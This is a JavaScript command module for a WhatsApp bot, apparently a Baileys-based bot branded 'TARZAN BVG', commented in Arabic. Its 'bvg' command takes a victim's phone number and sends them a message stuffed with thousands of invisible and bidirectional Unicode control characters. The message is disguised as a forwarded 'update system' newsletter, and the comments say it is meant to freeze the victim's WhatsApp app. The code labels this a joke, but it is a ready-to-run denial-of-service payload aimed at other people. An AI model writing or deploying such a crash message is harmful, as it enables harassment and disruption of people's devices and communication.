const moment = require('moment-timezone');
const { jidNormalizedUser } = require('@whiskeysockets/baileys');

// تخزين الجلسات النشطة لـ BVG
const activeBvgSessions = new Map();

// الرموز المخفية التي تؤدي إلى تجميد التطبيق
const hiddenChars = {
    // رموز غير مرئية تسبب تجميد التطبيق
    invisible: '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\u2064',
    // رموز طويلة تسبب تعليق المعالج
    longChars: '\u202A\u202B\u202C\u202D\u202E\u2066\u2067\u2068\u2069\u200B\u200C\u200D\u200E\u200F'
};

// رسائل التجميد المخفية
const freezeMessages = [
    {
        header: '\u202A\u202B\u202C\u202D\u202E',
        body: '\u2066\u2067\u2068\u2069\u200B\u200C\u200D\u200E\u200F',
        footer: '\u202A\u202B\u202C\u202D\u202E'
    },
    {
        header: '\u200B\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E',
        body: '\u2060\u2061\u2062\u2063\u2064\u2066\u2067\u2068\u2069',
        footer: '\u200B\u200C\u200D\u200E\u200F'
    }
];

module.exports = {
    name: 'bvg',
    aliases: ['تجميد', 'تعطيل', 'فريز'],
    description: '📱 BVG السفاح - تجميد واتساب المستهدف (مزحة حقيقية)',
    async execute({ sock, msg, args, text, reply, from, isGroup, sender, pushName, isFromMe, prefix, commandName }) {
        
        try {
            // التحقق من وجود رقم
            if (args.length < 1) {
                return reply(`📱 *أمر BVG السفاح*\n\n📌 *الاستخدام:*\n${prefix}bvg +967770133222\n${prefix}bvg @مستخدم\n\n📌 *لإلغاء التجميد:*\n${prefix}حذف bvg +967770133222\n\n⚠️ *تحذير:* هذا الأمر يقوم بتجميد واتساب المستهدف مؤقتاً (مزحة)`);
            }

            // التحقق من أمر الإلغاء
            if (args[0].toLowerCase() === 'حذف' || args[0].toLowerCase() === 'delete' || args[0].toLowerCase() === 'الغاء') {
                const targetNumber = args[1]?.replace(/[^0-9+]/g, '');
                if (!targetNumber) {
                    return reply(`❌ يرجى تحديد الرقم المراد إلغاء تجميده.\n📌 استخدم: ${prefix}حذف bvg +967770133222`);
                }
                return await handleUnfreeze(sock, from, reply, targetNumber);
            }

            // استخراج الرقم المستهدف
            let targetJid = null;
            let targetNumber = '';

            // البحث عن المستهدف من المنشن
            if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
                targetJid = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
                targetNumber = targetJid.split('@')[0];
            } 
            // البحث من النص
            else {
                targetNumber = args[0].replace(/[^0-9+]/g, '');
                if (!targetNumber.startsWith('+')) {
                    targetNumber = '+' + targetNumber;
                }
                if (targetNumber.length > 8) {
                    targetJid = `${targetNumber}@s.whatsapp.net`;
                }
            }

            if (!targetJid) {
                return reply(`❌ رقم غير صحيح! تأكد من صيغة الرقم.\n📌 مثال: +967770133222`);
            }

            // التحقق من عدم تكرار التجميد
            if (activeBvgSessions.has(targetJid)) {
                return reply(`⚠️ *الرقم ${targetNumber} مجمد بالفعل!*\n📌 استخدم: ${prefix}حذف bvg ${targetNumber} لإلغاء التجميد`);
            }

            await sock.sendMessage(from, { 
                react: { text: '📱', key: msg.key } 
            });

            // إرسال رسالة تحذير
            await reply(`📱 *جاري تنفيذ BVG على ${targetNumber}...*\n⏳ سيتم تجميد التطبيق خلال ثوانٍ`);

            // توليد الرسالة المخفية
            const freezeMessage = generateFreezeMessage();

            // إرسال الرسالة المخفية للمستهدف
            try {
                // إرسال رسالة فارغة طويلة تحتوي على رموز مخفية
                await sock.sendMessage(targetJid, {
                    text: freezeMessage,
                    contextInfo: {
                        mentionedJid: [targetJid],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363@newsletter',
                            newsletterName: 'نظام التحديث',
                            serverMessageId: -1
                        }
                    }
                });

                // تسجيل الجلسة
                activeBvgSessions.set(targetJid, {
                    number: targetNumber,
                    date: moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD'),
                    executor: pushName,
                    executorJid: sender,
                    messageId: msg.key.id
                });

                // إرسال رسالة متابعة لتأكيد التجميد
                setTimeout(async () => {
                    try {
                        await sock.sendMessage(targetJid, {
                            text: '🔄',
                            contextInfo: {
                                mentionedJid: [targetJid],
                                isForwarded: true
                            }
                        });
                    } catch (e) {}
                }, 1000);

                // إرسال تقرير للمنفذ
                const report = `📱 *تقرير BVG السفاح*\n\n✅ *تم التجميد بنجاح!*\n\n👤 *المستهدف:* ${targetNumber}\n🕒 *الوقت:* ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n📊 *الحالة:* مجمد 🧊\n\n📌 *لإلغاء التجميد:*\n${prefix}حذف bvg ${targetNumber}\n\n😄 *هذه مجرد مزحة!*\n📱 *— TARZAN BVG*`;

                await sock.sendMessage(from, {
                    text: report,
                    contextInfo: { mentionedJid: [sender] }
                });

                // إرسال نسخة للخاص
                const selfId = jidNormalizedUser(sock.user.id);
                await sock.sendMessage(selfId, {
                    text: `📱 *سجل BVG*\n\n👤 المستهدف: ${targetNumber}\n🕒 الوقت: ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n✅ تم التجميد بنجاح`
                });

            } catch (error) {
                console.error('❌ فشل BVG:', error);
                await reply(`❌ فشل تجميد الرقم ${targetNumber}. تأكد من صحة الرقم.`);
            }

        } catch (error) {
            console.error('❌ خطأ في BVG:', error);
            reply(`❌ حدث خطأ: ${error.message || 'خطأ غير معروف'}`);
        }
    }
};

// ==========================================
// دالة توليد رسالة التجميد المخفية
// ==========================================
function generateFreezeMessage() {
    const randomMsg = freezeMessages[Math.floor(Math.random() * freezeMessages.length)];
    
    // بناء رسالة التجميد مع رموز مخفية
    let message = '';
    
    // إضافة رموز البداية
    message += randomMsg.header;
    
    // إضافة رموز طويلة جداً (تسبب تعليق المعالج)
    for (let i = 0; i < 1000; i++) {
        message += hiddenChars.invisible;
        if (i % 50 === 0) {
            message += hiddenChars.longChars;
        }
    }
    
    // إضافة رموز النهاية
    message += randomMsg.footer;
    
    // إضافة رموز إضافية مخفية
    for (let i = 0; i < 500; i++) {
        message += '\u2060\u2061\u2062\u2063\u2064';
    }
    
    return message;
}

// ==========================================
// دالة إلغاء التجميد
// ==========================================
async function handleUnfreeze(sock, from, reply, targetNumber) {
    try {
        // البحث عن الجلسة
        let targetJid = null;
        let sessionData = null;
        
        for (const [jid, data] of activeBvgSessions) {
            if (data.number === targetNumber || jid.includes(targetNumber)) {
                targetJid = jid;
                sessionData = data;
                break;
            }
        }

        if (!sessionData) {
            return reply(`❌ الرقم ${targetNumber} ليس مجمداً حالياً.`);
        }

        // إرسال رسالة إلغاء التجميد
        await sock.sendMessage(targetJid, {
            text: '✅ *تم إلغاء التجميد*\n📱 يمكنك استخدام التطبيق الآن',
            contextInfo: {
                mentionedJid: [targetJid],
                isForwarded: true
            }
        });

        // حذف الجلسة
        activeBvgSessions.delete(targetJid);

        // إرسال تقرير للمنفذ
        const report = `✅ *تم إلغاء تجميد ${targetNumber}!*\n\n👤 *بواسطة:* ${sessionData.executor}\n🕒 *وقت التجميد:* ${sessionData.date}\n🕒 *وقت الإلغاء:* ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n\n📱 *— TARZAN BVG*`;

        await reply(report);

        // إرسال نسخة للخاص
        const selfId = jidNormalizedUser(sock.user.id);
        await sock.sendMessage(selfId, {
            text: `📱 *إلغاء BVG*\n\n👤 المستهدف: ${targetNumber}\n🕒 وقت الإلغاء: ${moment().tz('Asia/Riyadh').format('HH:mm:ss | YYYY-MM-DD')}\n✅ تم إلغاء التجميد`
        });

    } catch (error) {
        console.error('❌ فشل إلغاء التجميد:', error);
        reply(`❌ فشل إلغاء التجميد: ${error.message}`);
    }
}

